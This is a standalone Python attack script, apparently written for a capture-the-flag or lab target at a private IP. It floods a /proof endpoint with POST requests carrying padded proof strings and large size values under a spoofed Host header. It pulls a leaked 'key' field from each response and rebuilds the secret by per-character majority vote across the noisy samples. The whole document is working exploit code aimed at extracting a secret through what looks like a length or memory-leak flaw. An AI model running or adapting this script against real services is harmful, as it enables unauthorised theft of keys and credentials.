import json
import re
import urllib.request
from collections import Counter

TARGET = "10.113.161.234"
HOST = "c4rp3d13m.net"

base = f"http://{TARGET}"

proofs = ["a" * 42, "z" * 42, "wallet" * 16, "proof" * 16]
sizes = list(range(54000, 65001, 32))

allowed = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")

samples = []
for proof in proofs:
    for size in sizes:
        data = json.dumps({"size": size, "proof": proof}).encode()
        req = urllib.request.Request(
            base + "/proof",
            data=data,
            method="POST",
            headers={"Host": HOST, "Content-Type": "application/json", "User-Agent": "rk/1.0"},
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                text = resp.read().decode("latin1", "ignore")
        except Exception:
            continue

        m = re.search(r'"key"\s*:\s*"([^"]{20,260})"', text, re.IGNORECASE)
        if not m:
            continue
        raw = m.group(1)
        samples.append(raw)

print("samples", len(samples))
if not samples:
    raise SystemExit(1)

max_len = max(len(s) for s in samples)
consensus = []
for i in range(max_len):
    c = Counter()
    for s in samples:
        if i >= len(s):
            continue
        ch = s[i]
        if ch in allowed:
            c[ch] += 1
    if not c:
        consensus.append("?")
    else:
        consensus.append(c.most_common(1)[0][0])

res = "".join(consensus).rstrip("?")
print("consensus_raw", res)
print("len", len(res))

# Also provide cleaned versions for testing.
clean = "".join(ch for ch in res if ch in allowed)
print("clean", clean)
print("clean_len", len(clean))

# Print top variants to inspect differences.
norm = []
for s in samples:
    norm.append("".join(ch if ch in allowed else "?" for ch in s))
uniq = {}
for s in norm:
    uniq[s] = uniq.get(s, 0) + 1
print("unique normalized", len(uniq))
for k, v in sorted(uniq.items(), key=lambda kv: kv[1], reverse=True)[:10]:
    print(v, k)
